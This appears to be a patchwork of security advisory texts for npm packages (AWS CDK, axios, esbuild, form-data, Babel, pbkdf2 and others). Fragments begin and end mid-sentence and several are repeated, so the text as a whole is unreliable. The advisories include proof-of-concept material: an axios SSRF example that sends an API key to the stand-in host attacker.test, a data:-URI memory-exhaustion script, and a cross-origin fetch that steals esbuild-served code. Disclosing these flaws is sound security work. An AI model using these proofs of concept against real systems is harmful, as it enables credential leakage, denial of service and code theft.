Users use it to create their own applications, which are converted to AWS CloudFormation templates during deployment to a user's AWS account. AWS CDK contains pre-built components called \"constructs,\" which are higher-level abstractions providing defaults and best practices. This approach enables developers to use familiar programming languages to define complex cloud infrastructure more efficiently than writing raw CloudFormation templates.\n\nThe [AWS CodePipeline](https://aws.amazon.com/codepipeline/) construct deploys CodePipeline, a managed service that orchestrates software release processes through a series of stages, each comprising one or more actions executed by CodePipeline. To perform these actions, CodePipeline assumes IAM roles with permissions necessary for each step, allowing it to interact with AWS services and resources on behalf of the user.\n\nAn issue exists where, when using CDK to create a CodePipeline with the CDK Construct Library, CDK creates an AWS Identity and Access Management (AWS IAM) trust policy with overly broad permissions. Any user with unrestricted sts:AssumeRole permissions could assume that trust policy. This issue does not affect users who supply their own role for CodePipeline.\n\n### Impact\nTo leverage the issue, an actor has to be authenticated in the account and have an unrestricted sts:AssumeRole permission. The permissions an actor could leverage depend on the actions added to the pipeline. Possible permissions include actions on services such as CloudFormation, CodeCommit, Lambda, and ECS, as well as access to the S3 bucket holding pipeline build artifacts ([see documentation](https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_codepipeline_actions-readme.html)). \n\nUsers can review their AWS CloudTrail logs for when the role was assumed to determine if this was expected. \n\n#### Impacted versions: \u003cv2.189.0\n\n### Patches\nThe patches are included in the CDK Construct Library release [v2.189.0](https://github.com/aws/aws-cdk/releases/tag/v2.189.0). We recommend upgrading to the latest version and ensuring any forked or derivative code is patched to incorporate the new fixes. \n\nWhen new CDK applications using the latest version are initialized, they will use the new behavior with more restrictive permissions.\n\nExisting applications must upgrade to the latest version, change the [feature flag](https://github.com/aws/aws-cdk/blob/main/packages/aws-cdk-lib/cx-api/FEATURE_FLAGS.md) (@aws-cdk/pipelines:reduceStageRoleTrustScope)  and (@aws-cdk/pipelines:reduceCrossAccountActionRoleTrustScope) to true and redeploy the application to apply this fix and use the new behavior with more restrictive permissions.\n\n### Workarounds\nYou can explicitly supply the role for your [CodePipeline](https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_codepipeline-readme.html#cross-account-codepipelines) and follow the policy recommendations detailed in [CodePipeline documentation](https://docs.aws.amazon.com/codepipeline/latest/userguide/pipelines-create-cross-account.html).\n\n### References\n[Original reporting issue.](https://github.com/aws/aws-cdk/issues/33709)\n\n\n\nIf you have any questions or comments about this advisory please contact AWS/Amazon Security via our [vulnerability reporting page](https://aws.amazon.com/security/vulnerability-reporting) or directly via email to [aws-security@amazon.com](mailto:aws-security@amazon.com).

              "details": "### Summary\nThe [AWS Cloud Development Kit (CDK)](https://aws.amazon.com/cdk/) is an open-source framework for defining cloud infrastructure using code. Customers use it to create their own applications which are converted to AWS CloudFormation templates during deployment to a customer’s AWS account. CDK contains pre-built components called \"[constructs](https://docs.aws.amazon.com/cdk/v2/guide/constructs.html)\" that are higher-level abstractions providing defaults and best practices. This approach enables developers to use familiar programming languages to define complex cloud infrastructure more efficiently than writing raw CloudFormation templates.\n\nThe CDK [Cognito UserPool](https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_cognito.UserPool.html) construct deploys an AWS cognito user pool. An [Amazon Cognito user pool](https://docs.aws.amazon.com/cognito/latest/developerguide/cognito-user-pools.html) is a user directory for web and mobile app authentication and authorization. Customers can deploy a client under this user pool through construct ‘[UserPoolClient](https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_cognito.UserPoolClient.html)’ or through helper method '[addClient](https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_cognito.UserPool.html#addwbrclientid-options)'. A user pool client resource represents an Amazon [Cognito user pool client](https://docs.aws.amazon.com/cognito/latest/developerguide/user-pool-settings-client-apps.html) which is a configuration within a user pool that interacts with one mobile or web application authenticating with Amazon Cognito. \n\n\nWhen users of the 'cognito.UserPoolClient' construct generate a secret value for the application client in AWS CDK, they can then reference the generated secrets in their stack. The CDK had an issue where, when the custom resource performed an SDK API call to 'DescribeCognitoUserPoolClient' to retrieve the generated secret, the full response was logged in the associated lambda function's log group. Any user authenticated in the account where logs of the custom resource are accessible and who has read-only permission could view the secret written to those logs. \n\nThis issue does not affect customers who are generating the secret value outside of the CDK as the secret is not referenced or logged.\n\n### Impact\nTo leverage this issue, an actor has to be authenticated in the account where logs of the custom resource Custom::DescribeCognitoUserPoolClient are accessible and have read-only permission for lambda function logs. \n\nUsers can review access to their log group through AWS CloudTrail logs to detect any unexpected access to read the logs.\n\n**Impacted versions: \u003e2.37.0 and \u003c=2.187.0**\n\n### Patches\nThe patches are included in the AWS CDK Library release v2.187.0. We recommend upgrading to the latest version and ensuring any forked or derivative code is patched to incorporate the new fixes. To fully address this issue, users should rotate the secret by generating a new secret stored in AWS Secrets Manager. References to the secret will use the new secret on update. \n\nWhen new CDK applications using the latest version are initialized, they will use the new behavior with updated logging. \n\nExisting applications must upgrade to the latest version, change the [feature flag](https://github.com/aws/aws-cdk/blob/main/packages/aws-cdk-lib/cx-api/FEATURE_FLAGS.md) (@aws-cdk/cognito:logUserPoolClientSecretValue) to false, redeploy the application to apply this fix and use the new implementation with updated logging behavior.\n\n### Workarounds\nUsers can override the implementation changing Logging to be Logging.withDataHidden(). For example define class CustomUserPoolClient extends UserPoolClient and  in the new class define get userPoolClientSecret() to use Logging.withDataHidden().\n\n\n\nExample\n\n    export class CustomUserPoolClient extends UserPoolClient {\n\n      private readonly customUserPool : UserPool;\n      private readonly customuserPoolClientId : string;\n      constructor(scope: Construct, id: string, props: UserPoolClientProps) {\n        super(scope, id, props);\n\n        this.customUserPool = new UserPool(this, 'pool', {\n          removalPolicy: RemovalPolicy.DESTROY,\n        });\n\n        const client = this.customUserPool.addClient('client', { generateSecret: true });\n      }\n\n\n\n      // Override the userPoolClientSecret getter to always return the secret\n      public get userPoolClientSecret(): SecretValue {\n        // Create the Custom Resource that assists in resolving the User Pool Client secret\n        const secretValue = SecretValue.resourceAttribute(new AwsCustomResource(\n          this,\n          'DescribeCognitoUserPoolClient',\n          {\n        resourceType: 'Custom::DescribeCognitoUserPoolClient',\n        onUpdate: {\n          region: cdk.Stack.of(this).region,\n          service: 'CognitoIdentityServiceProvider',\n          action: 'describeUserPoolClient',\n          parameters: {\n            UserPoolId: this.customUserPool.userPoolId,\n            ClientId: this.customUserPool,\n          },\n          physicalResourceId: PhysicalResourceId.of(this.userPoolClientId),\n          // Disable logging of sensitive data\n          logging: Logging.withDataHidden(),\n        },\n        policy: AwsCustomResourcePolicy.fromSdkCalls({\n          resources: [this.customUserPool.userPoolArn],\n        }),\n        installLatestAwsSdk: false,\n          },\n        ).getResponseField('UserPoolClient.ClientSecret'));\n        \n        return secretValue;\n      }\n    }\n\n\n\n### References\nIf you have any questions or comments about this advisory please contact AWS/Amazon Security via our [vulnerability reporting page](https://aws.amazon.com/security/vulnerability-reporting) or directly via email to [aws-security@amazon.com](mailto:aws-security@amazon.com).

However, this could be a breaking change for existing CDK applications and we should fix this with a feature flag. \n\nNote that this is marked as low severity Security advisory because the issuer url is provided by CDK users who define the CDK application. If they insist on connecting to a unauthorized OIDC provider, CDK should not disallow this. Additionally, the code block is run in a Lambda environment which mitigate the MITM attack.\n\nAs a best practice, CDK should still fix this issue under a feature flag to avoid regression.\n\n```\npackages/@aws-cdk/custom-resource-handlers/lib/aws-iam/oidc-handler/external.ts\n❯❱ problem-based-packs.insecure-transport.js-node.bypass-tls-verification.bypass-tls-verification\nChecks for setting the environment variable NODE_TLS_REJECT_UNAUTHORIZED to 0, which disables TLS\nverification. This should only be used for debugging purposes. Setting the option rejectUnauthorized\nto false bypasses verification against the list of trusted CAs, which also leads to insecure\ntransport.\n```\n\n### Patches\nThe patch is in progress. To mitigate, upgrade to CDK v2.177.0 (Expected release date 2025-02-22). \nOnce upgraded, please make sure the feature flag '@aws-cdk/aws-iam:oidcRejectUnauthorizedConnections' is set to true in `cdk.context.json` or `cdk.json`.

              "details": "## Summary\n\nWhen Axios runs on Node.js and is given a URL with the `data:` scheme, it does not perform HTTP. Instead, its Node http adapter decodes the entire payload into memory (`Buffer`/`Blob`) and returns a synthetic 200 response.\nThis path ignores `maxContentLength` / `maxBodyLength` (which only protect HTTP responses), so an attacker can supply a very large `data:` URI and cause the process to allocate unbounded memory and crash (DoS), even if the caller requested `responseType: 'stream'`.\n\n## Details\n\nThe Node adapter (`lib/adapters/http.js`) supports the `data:` scheme. When `axios` encounters a request whose URL starts with `data:`, it does not perform an HTTP request. Instead, it calls `fromDataURI()` to decode the Base64 payload into a Buffer or Blob.\n\nRelevant code from [`[httpAdapter](https://github.com/axios/axios/blob/c959ff29013a3bc90cde3ac7ea2d9a3f9c08974b/lib/adapters/http.js#L231)`](https://github.com/axios/axios/blob/c959ff29013a3bc90cde3ac7ea2d9a3f9c08974b/lib/adapters/http.js#L231):\n\n```js\nconst fullPath = buildFullPath(config.baseURL, config.url, config.allowAbsoluteUrls);\nconst parsed = new URL(fullPath, platform.hasBrowserEnv ? platform.origin : undefined);\nconst protocol = parsed.protocol || supportedProtocols[0];\n\nif (protocol === 'data:') {\n  let convertedData;\n  if (method !== 'GET') {\n    return settle(resolve, reject, { status: 405, ... });\n  }\n  convertedData = fromDataURI(config.url, responseType === 'blob', {\n    Blob: config.env \u0026\u0026 config.env.Blob\n  });\n  return settle(resolve, reject, { data: convertedData, status: 200, ... });\n}\n```\n\nThe decoder is in [`[lib/helpers/fromDataURI.js](https://github.com/axios/axios/blob/c959ff29013a3bc90cde3ac7ea2d9a3f9c08974b/lib/helpers/fromDataURI.js#L27)`](https://github.com/axios/axios/blob/c959ff29013a3bc90cde3ac7ea2d9a3f9c08974b/lib/helpers/fromDataURI.js#L27):\n\n```js\nexport default function fromDataURI(uri, asBlob, options) {\n  ...\n  if (protocol === 'data') {\n    uri = protocol.length ? uri.slice(protocol.length + 1) : uri;\n    const match = DATA_URL_PATTERN.exec(uri);\n    ...\n    const body = match[3];\n    const buffer = Buffer.from(decodeURIComponent(body), isBase64 ? 'base64' : 'utf8');\n    if (asBlob) { return new _Blob([buffer], {type: mime}); }\n    return buffer;\n  }\n  throw new AxiosError('Unsupported protocol ' + protocol, ...);\n}\n```\n\n* The function decodes the entire Base64 payload into a Buffer with no size limits or sanity checks.\n* It does **not** honour `config.maxContentLength` or `config.maxBodyLength`, which only apply to HTTP streams.\n* As a result, a `data:` URI of arbitrary size can cause the Node process to allocate the entire content into memory.\n\nIn comparison, normal HTTP responses are monitored for size, the HTTP adapter accumulates the response into a buffer and will reject when `totalResponseBytes` exceeds [`[maxContentLength](https://github.com/axios/axios/blob/c959ff29013a3bc90cde3ac7ea2d9a3f9c08974b/lib/adapters/http.js#L550)`](https://github.com/axios/axios/blob/c959ff29013a3bc90cde3ac7ea2d9a3f9c08974b/lib/adapters/http.js#L550). No such check occurs for `data:` URIs.\n\n\n## PoC\n\n```js\nconst axios = require('axios');\n\nasync function main() {\n  // this example decodes ~120 MB\n  const base64Size = 160_000_000; // 120 MB after decoding\n  const base64 = 'A'.repeat(base64Size);\n  const uri = 'data:application/octet-stream;base64,' + base64;\n\n  console.log('Generating URI with base64 length:', base64.length);\n  const response = await axios.get(uri, {\n    responseType: 'arraybuffer'\n  });\n\n  console.log('Received bytes:', response.data.length);\n}\n\nmain().catch(err =\u003e {\n  console.error('Error:', err.message);\n});\n```\n\nRun with limited heap to force a crash:\n\n```bash\nnode --max-old-space-size=100 poc.js\n```\n\nSince Node heap is capped at 100 MB, the process terminates with an out-of-memory error:\n\n```\n\u003c--- Last few GCs ---\u003e\n…\nFATAL ERROR: Reached heap limit Allocation failed - JavaScript heap out of memory\n1: 0x… node::Abort() …\n…\n```\n\nMini Real App PoC:\nA small link-preview service that uses axios streaming, keep-alive agents, timeouts, and a JSON body.

If `config.maxContentLength` or `config.maxBodyLength` is set, reject URIs whose payload exceeds the limit.\n\n2. **Stream decoding**\n   Instead of decoding the entire payload in one `Buffer.from` call, decode the Base64 string in chunks using a streaming Base64 decoder. This would allow the application to process the data incrementally and abort if it grows too large.",

              "details": "### Summary\n\nA previously reported issue in axios demonstrated that using protocol-relative URLs could lead to SSRF (Server-Side Request Forgery). Reference: axios/axios#6463\n\nA similar problem that occurs when passing absolute URLs rather than protocol-relative URLs to axios has been identified. Even if ⁠`baseURL` is set, axios sends the request to the specified absolute URL, potentially causing SSRF and credential leakage. This issue impacts both server-side and client-side usage of axios.\n\n### Details\n\nConsider the following code snippet:\n\n```js\nimport axios from \"axios\";\n\nconst internalAPIClient = axios.create({\n  baseURL: \"http://example.test/api/v1/users/\",\n  headers: {\n    \"X-API-KEY\": \"1234567890\",\n  },\n});\n\n// const userId = \"123\";\nconst userId = \"http://attacker.test/\";\n\nawait internalAPIClient.get(userId); // SSRF\n```\n\nIn this example, the request is sent to `http://attacker.test/` instead of the `baseURL`. As a result, the domain owner of `attacker.test` would receive the `X-API-KEY` included in the request headers.\n\nIt is recommended that:\n\n-\tWhen `baseURL` is set, passing an absolute URL such as `http://attacker.test/` to `get()` should not ignore `baseURL`.\n-\tBefore sending the HTTP request (after combining the `baseURL` with the user-provided parameter), axios should verify that the resulting URL still begins with the expected `baseURL`.\n\n### PoC\n\nFollow the steps below to reproduce the issue:\n\n1.\tSet up two simple HTTP servers:\n\n```\nmkdir /tmp/server1 /tmp/server2\necho \"this is server1\" \u003e /tmp/server1/index.html \necho \"this is server2\" \u003e /tmp/server2/index.html\npython -m http.server -d /tmp/server1 10001 \u0026\npython -m http.server -d /tmp/server2 10002 \u0026\n```\n\n\n2.\tCreate a script (e.g., main.js):\n\n```js\nimport axios from \"axios\";\nconst client = axios.create({ baseURL: \"http://localhost:10001/\" });\nconst response = await client.get(\"http://localhost:10002/\");\nconsole.log(response.data);\n```\n\n3.\tRun the script:\n\n```\n$ node main.js\nthis is server2\n```\n\nEven though `baseURL` is set to `http://localhost:10001/`, axios sends the request to `http://localhost:10002/`.\n\n### Impact\n\n-\tCredential Leakage: Sensitive API keys or credentials (configured in axios) may be exposed to unintended third-party hosts if an absolute URL is passed.\n-\tSSRF (Server-Side Request Forgery): Attackers can send requests to other internal hosts on the network where the axios program is running.\n-\tAffected Users: Software that uses `baseURL` and does not validate path parameters is affected by this issue.",

Hash state rewind on `{length: -x}`. This is behind the PoC above, also this way an attacker can turn a tagged hash in cryptographic libraries into an untagged hash.\n2. Value miscalculation, e.g. a collision is generated by `{ length: buf.length, ...buf, 0: buf[0] + 256 }`\n    This will result in the same hash as of `buf`, but can be treated by other code differently (e.g. bn.js)\n4. DoS on `{length:'1e99'}`\n5. On a subsequent system, (2) can turn into matching hashes but different numeric representations, leading to issues up to private key extraction from cryptography libraries (as nonce is often generated through a hash, and matching nonces for different values often immediately leads to private key restoration, like [GHSA-vjh7-7g9h-fjfh](https://github.com/indutny/elliptic/security/advisories/GHSA-vjh7-7g9h-fjfh))\n6. Also, other typed arrays results are invalid, e.g. returned hash of `new Uint16Array(5)` is the same as `new Uint8Array(5)`, not `new Uint16Array(10)` as it should have been (and is in Node.js `crypto`) -- same for arrays with values non-zero, their hashes are just truncated to `%256` instead of converted to correct bytelength",

The attacker serves a malicious web page (`http://malicious.example.com`).\n1. The user accesses the malicious web page.\n1. The attacker sends a `fetch('http://127.0.0.1:8000/main.js')` request by JS in that malicious web page. This request is normally blocked by same-origin policy, but that's not the case for the reasons above.\n1. The attacker gets the content of `http://127.0.0.1:8000/main.js`.\n\nIn this scenario, I assumed that the attacker knows the URL of the bundle output file name. But the attacker can also get that information by\n\n- Fetching `/index.html`: normally you have a script tag here\n- Fetching `/assets`: it's common to have a `assets` directory when you have JS files and CSS files in a different directory and the directory listing feature tells the attacker the list of files\n- Connecting `/esbuild` SSE endpoint: the SSE endpoint sends the URL path of the changed files when the file is changed (`new EventSource('/esbuild').addEventListener('change', e =\u003e console.log(e.type, e.data))`)\n- Fetching URLs in the known file: once the attacker knows one file, the attacker can know the URLs imported from that file\n\nThe scenario above fetches the compiled content, but if the victim has the source map option enabled, the attacker can also get the non-compiled content by fetching the source map file.\n\n### PoC\n\n1. Download [reproduction.zip](https://github.com/user-attachments/files/18561484/reproduction.zip)\n2. Extract it and move to that directory\n1. Run `npm i`\n1. Run `npm run watch`\n1. Run `fetch('http://127.0.0.1:8000/app.js').then(r =\u003e r.text()).then(content =\u003e console.log(content))` in a different website's dev tools.\n\n![image](https://github.com/user-attachments/assets/08fc2e4d-e1ec-44ca-b0ea-78a73c3c40e9)\n\n### Impact\n\nUsers using the serve feature may get the source code stolen by malicious websites.",

This can lead to a security issue if an attacker:\n1. can observe other values produced by Math.random in the target application, and\n2. can control one field of a request made using form-data\n\nBecause the values of Math.random() are pseudo-random and predictable (see: https://blog.securityevaluators.com/hacking-the-javascript-lottery-80cc437e3b7f), an attacker who can observe a few sequential values can determine the state of the PRNG and predict future values, includes those used to generate form-data's boundary value. The allows the attacker to craft a value that contains a boundary value, allowing them to inject additional parameters into the request.\n\nThis is largely the same vulnerability as was [recently found in `undici`](https://hackerone.com/reports/2913312) by [`parrot409`](https://hackerone.com/parrot409?type=user) -- I'm not affiliated with that researcher but want to give credit where credit is due! My PoC is largely based on their work.\n\n### Details\n\nThe culprit is this line here: https://github.com/form-data/form-data/blob/426ba9ac440f95d1998dac9a5cd8d738043b048f/lib/form_data.js#L347\n\nAn attacker who is able to predict the output of Math.random() can predict this boundary value, and craft a payload that contains the boundary value, followed by another, fully attacker-controlled field. This is roughly equivalent to any sort of improper escaping vulnerability, with the caveat that the attacker must find a way to observe other Math.random() values generated by the application to solve for the state of the PRNG. However, Math.random() is used in all sorts of places that might be visible to an attacker (including by form-data itself, if the attacker can arrange for the vulnerable application to make a request to an attacker-controlled server using form-data, such as a user-controlled webhook -- the attacker could observe the boundary values from those requests to observe the Math.random() outputs). A common example would be a `x-request-id` header added by the server. These sorts of headers are often used for distributed tracing, to correlate errors across the frontend and backend. `Math.random()` is a fine place to get these sorts of IDs (in fact, [opentelemetry uses Math.random for this purpose](https://github.com/open-telemetry/opentelemetry-js/blob/2053f0d3a44631ade77ea04f656056a2c8a2ae76/packages/opentelemetry-sdk-trace-base/src/platform/node/RandomIdGenerator.ts#L22))\n\n### PoC\n\nPoC here: https://github.com/benweissmann/CVE-2025-7783-poc\n\nInstructions are in that repo. It's based on the PoC from https://hackerone.com/reports/2913312 but simplified somewhat; the vulnerable application has a more direct side-channel from which to observe Math.random() values (a separate endpoint that happens to include a randomly-generated request ID). \n\n### Impact\n\nFor an application to be vulnerable, it must:\n- Use `form-data` to send data including user-controlled data to some other system. The attacker must be able to do something malicious by adding extra parameters (that were not intended to be user-controlled) to this request. Depending on the target system's handling of repeated parameters, the attacker might be able to overwrite values in addition to appending values (some multipart form handlers deal with repeats by overwriting values instead of representing them as an array)\n- Reveal values of Math.random(). It's easiest if the attacker can observe multiple sequential values, but more complex math could recover the PRNG state to some degree of confidence with non-sequential values. \n\nIf an application is vulnerable, this allows an attacker to make arbitrary requests to internal systems.",

My PoC is largely based on their work.\n\n### Details\n\nThe culprit is this line here: https://github.com/form-data/form-data/blob/426ba9ac440f95d1998dac9a5cd8d738043b048f/lib/form_data.js#L347\n\nAn attacker who is able to predict the output of Math.random() can predict this boundary value, and craft a payload that contains the boundary value, followed by another, fully attacker-controlled field. This is roughly equivalent to any sort of improper escaping vulnerability, with the caveat that the attacker must find a way to observe other Math.random() values generated by the application to solve for the state of the PRNG. However, Math.random() is used in all sorts of places that might be visible to an attacker (including by form-data itself, if the attacker can arrange for the vulnerable application to make a request to an attacker-controlled server using form-data, such as a user-controlled webhook -- the attacker could observe the boundary values from those requests to observe the Math.random() outputs). A common example would be a `x-request-id` header added by the server. These sorts of headers are often used for distributed tracing, to correlate errors across the frontend and backend. `Math.random()` is a fine place to get these sorts of IDs (in fact, [opentelemetry uses Math.random for this purpose](https://github.com/open-telemetry/opentelemetry-js/blob/2053f0d3a44631ade77ea04f656056a2c8a2ae76/packages/opentelemetry-sdk-trace-base/src/platform/node/RandomIdGenerator.ts#L22))\n\n### PoC\n\nPoC here: https://github.com/benweissmann/CVE-2025-7783-poc\n\nInstructions are in that repo. It's based on the PoC from https://hackerone.com/reports/2913312 but simplified somewhat; the vulnerable application has a more direct side-channel from which to observe Math.random() values (a separate endpoint that happens to include a randomly-generated request ID). \n\n### Impact\n\nFor an application to be vulnerable, it must:\n- Use `form-data` to send data including user-controlled data to some other system. The attacker must be able to do something malicious by adding extra parameters (that were not intended to be user-controlled) to this request. Depending on the target system's handling of repeated parameters, the attacker might be able to overwrite values in addition to appending values (some multipart form handlers deal with repeats by overwriting values instead of representing them as an array)\n- Reveal values of Math.random(). It's easiest if the attacker can observe multiple sequential values, but more complex math could recover the PRNG state to some degree of confidence with non-sequential values. \n\nIf an application is vulnerable, this allows an attacker to make arbitrary requests to internal systems.",

              "details": "### Impact\n\nWhen using Babel to compile [regular expression named capturing groups](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Regular_expressions/Named_capturing_group), Babel will generate a polyfill for the `.replace` method that has quadratic complexity on some specific replacement pattern strings (i.e. the second argument passed to `.replace`).\n\nYour generated code is vulnerable if _all_ the following conditions are true:\n- You use Babel to compile [regular expression named capturing groups](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Regular_expressions/Named_capturing_group)\n- You use the `.replace` method on a regular expression that contains named capturing groups\n- **Your code uses untrusted strings as the second argument of `.replace`**\n\nIf you are using `@babel/preset-env` with the [`targets`](https://babeljs.io/docs/options#targets) option, the transform that injects the vulnerable code is automatically enabled if:\n- you use [_duplicated_ named capturing groups](https://github.com/tc39/proposal-duplicate-named-capturing-groups), and target any browser older than Chrome/Edge 126, Opera 112, Firefox 129, Safari 17.4, or Node.js 23\n- you use any [named capturing groups](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Regular_expressions/Named_capturing_group), and target any browser older than Chrome 64, Opera 71, Edge 79, Firefox 78, Safari 11.1, or Node.js 10\n\nYou can verify what transforms `@babel/preset-env` is using by enabling the [`debug` option](https://babeljs.io/docs/babel-preset-env#debug).\n\n\n### Patches\n\nThis problem has been fixed in `@babel/helpers` and `@babel/runtime` 7.26.10 and 8.0.0-alpha.17, please upgrade. It's likely that you do not directly depend on `@babel/helpers`, and instead you depend on `@babel/core` (which itself depends on `@babel/helpers`). Upgrading to `@babel/core` 7.26.10 is not required, but it guarantees that you are on a new enough `@babel/helpers` version.\n\nPlease note that just updating your Babel dependencies is not enough: you will also need to re-compile your code.\n\n### Workarounds\n\nIf you are passing user-provided strings as the second argument of `.replace` on regular expressions that contain named capturing groups, validate the input and make sure it does not contain the substring `$\u003c` if it's then not followed by `\u003e` (possibly with other characters in between).\n\n### References\n\nThis vulnerability was reported and fixed in https://github.com/babel/babel/pull/17173.",

The vulnerability occurs in `micromatch.braces()` in `index.js` because the pattern `.*` will greedily match anything. By passing a malicious payload, the pattern matching will keep backtracking to the input while it doesn't find the closing bracket. As the input size increases, the consumption time will also increase until it causes the application to hang or slow down. There was a merged fix but further testing shows the issue persisted prior to https://github.com/micromatch/micromatch/pull/266. This issue should be mitigated by using a safe pattern that won't start backtracking the regular expression due to greedy matching.\n",

By processing malicious input involving the __proto__ property, an attacker can manipulate the prototype chain of JavaScript objects, leading to denial of service or arbitrary code execution. This issue arises from insufficient validation of attribute namespace removal operations, allowing unintended modification of critical object prototypes. The vulnerability is addressed in version 2.19.1.",

Supported but non-normalized algos (e.g. `Sha256` / `Sha512` / `SHA1` / `sha-1` / `sha-256` / `sha-512`)\n\nAll of those work correctly in Node.js, but this polyfill silently returns highly predictable ouput\n\nUnder Node.js (only with `pbkdf2/browser` import, unlikely) / Bun (`pbkdf2` top-level import is affected), the memory is not zero-filled but is uninitialized, as `Buffer.allocUnsafe` is used\n\nUnder browsers, it just returns zero-filled buffers\n(Which is also critical, those are completely unacceptable as kdf output and ruin security)\n\n### Were you affected?\n\nThe full list of arguments that were **not** affected were literal:\n * `'md5'`\n * `'sha1'`\n * `'sha224'`\n * `'sha256'`\n * `'sha384'`\n * `'sha512'`\n * `'rmd160'`\n * `'ripemd160'`\n\nAny other arguments, e.g. representation variations of the above ones like `'SHA-1'`/`'sha-256'`/`'SHA512'` or  different algos like `'sha3-512'`/`'blake2b512'`, while supported on Node.js `crypto` module, returned predictable output on `pbkdf2` (or `crypto` browser/bundlers polyfill)\n\n---\n\nBeware of packages re-exporting this under a different signature, like (abstract):\n```js\nconst crypto = require('crypto')\nmodule.exports.deriveKey = (algo, pass, salt) =\u003e crypto.pbkdf2Sync(pass, salt, 2048, 64, algo)\n```\n\nIn this case, the resulting `deriveKey` method is also affected (to the same extent / conditions as listed here).\n\n### Environments\n\nThis affects `require('crypto')` in polyfilled mode (e.g. from `crypto-browserify`, `node-libs-browser`, `vite-plugin-node-polyfills`, `node-stdlib-browser`, etc. -- basically everything that bundles/polfyills `crypto`\n\n* In bundled code (e.g. Webpack / Vite / whatever), this affects `require('crypto')` and `require('pbkdf2')`\n* On Node.js, this does not affect `require('pbkdf2')` (or `require('crypto')` obviously), but affects `require('pbkdf2/browser')`\n* On Bun, this _does_ affect `require('pbkdf2')` _and_  `require('pbkdf2/browser')` (and returns uninitialized memory, often zeros / sparse flipped bytes)\n\n### PoC\n```js\nconst node = require('crypto')\nconst polyfill = require('pbkdf2/browser')\n\nconst algos = [\n  'sha3-512', 'sha3-256', 'SHA3-384',\n  'Sha256', 'Sha512', 'sha512-256',\n  'SHA1', 'sha-1',\n  'blake2b512',\n  'RMD160', 'RIPEMD-160', 'ripemd-160',\n]\nfor (const algo of algos) {\n  for (const { pbkdf2Sync } of [node, polyfill]) {\n    const key = pbkdf2Sync('secret', 'salt', 100000, 64, algo)\n    console.log(`${algo}: ${key.toString('hex')}`);\n  }\n}\n```\n\nOutput (odd lines are Node.js, even is `pbkdf2` module / polyfill):\n```\nsha3-512:

hex = key.toString('hex')\n  if (hex !== prev) console.log(hex);\n  prev = hex\n}\n```\n\n### Affected versions\n\nSeems to be since https://github.com/browserify/pbkdf2/commit/9699045c37a07f8319cfb8d44e2ff4252d7a7078\n\n### Impact\n\nThis is critical, browserifying code might silently generate zero-filled keys instead of proper ones, for code that was working on Node.js or in test environment\n\nJust updating to a fixed version is not enough: if anyone was using `pbkdf2` lib (e.g. via `crypto-browserify` or directly) on algos not from the literal string list (see \"were you affected\"), recheck where those keys went / how they were used,  and take action accordingly\n\n### Note\n\nMost likely, you receive this either through a subdep using `pbkdf2` module directly (and then it is used), or through `crypto-browserify` (and the usage depends on whether you or any of your subdeps were calling `pbkdf2/pbkdf2Sync` methods from Node.js crypto inside your bundle)\n\nWhen targeting non-Node.js, prever avoiding Node.js crypto polyfill at all, and use `crypto.subtle` and/or modern/audited cryptography primitives instead",

              "details": "### Impact\n\nWhen using Babel to compile [regular expression named capturing groups](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Regular_expressions/Named_capturing_group), Babel will generate a polyfill for the `.replace` method that has quadratic complexity on some specific replacement pattern strings (i.e. the second argument passed to `.replace`).\n\nYour generated code is vulnerable if _all_ the following conditions are true:\n- You use Babel to compile [regular expression named capturing groups](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Regular_expressions/Named_capturing_group)\n- You use the `.replace` method on a regular expression that contains named capturing groups\n- **Your code uses untrusted strings as the second argument of `.replace`**\n\nIf you are using `@babel/preset-env` with the [`targets`](https://babeljs.io/docs/options#targets) option, the transform that injects the vulnerable code is automatically enabled if:\n- you use [_duplicated_ named capturing groups](https://github.com/tc39/proposal-duplicate-named-capturing-groups), and target any browser older than Chrome/Edge 126, Opera 112, Firefox 129, Safari 17.4, or Node.js 23\n- you use any [named capturing groups](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Regular_expressions/Named_capturing_group), and target any browser older than Chrome 64, Opera 71, Edge 79, Firefox 78, Safari 11.1, or Node.js 10\n\nYou can verify what transforms `@babel/preset-env` is using by enabling the [`debug` option](https://babeljs.io/docs/babel-preset-env#debug).\n\n\n### Patches\n\nThis problem has been fixed in `@babel/helpers` and `@babel/runtime` 7.26.10 and 8.0.0-alpha.17, please upgrade. It's likely that you do not directly depend on `@babel/helpers`, and instead you depend on `@babel/core` (which itself depends on `@babel/helpers`). Upgrading to `@babel/core` 7.26.10 is not required, but it guarantees that you are on a new enough `@babel/helpers` version.\n\nPlease note that just updating your Babel dependencies is not enough: you will also need to re-compile your code.\n\n### Workarounds\n\nIf you are passing user-provided strings as the second argument of `.replace` on regular expressions that contain named capturing groups, validate the input and make sure it does not contain the substring `$\u003c` if it's then not followed by `\u003e` (possibly with other characters in between).\n\n### References\n\nThis vulnerability was reported and fixed in https://github.com/babel/babel/pull/17173.",

              "details": "### Impact\n\nWhen using Babel to compile [regular expression named capturing groups](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Regular_expressions/Named_capturing_group), Babel will generate a polyfill for the `.replace` method that has quadratic complexity on some specific replacement pattern strings (i.e. the second argument passed to `.replace`).\n\nYour generated code is vulnerable if _all_ the following conditions are true:\n- You use Babel to compile [regular expression named capturing groups](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Regular_expressions/Named_capturing_group)\n- You use the `.replace` method on a regular expression that contains named capturing groups\n- **Your code uses untrusted strings as the second argument of `.replace`**\n\nIf you are using `@babel/preset-env` with the [`targets`](https://babeljs.io/docs/options#targets) option, the transform that injects the vulnerable code is automatically enabled if:\n- you use [_duplicated_ named capturing groups](https://github.com/tc39/proposal-duplicate-named-capturing-groups), and target any browser older than Chrome/Edge 126, Opera 112, Firefox 129, Safari 17.4, or Node.js 23\n- you use any [named capturing groups](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Regular_expressions/Named_capturing_group), and target any 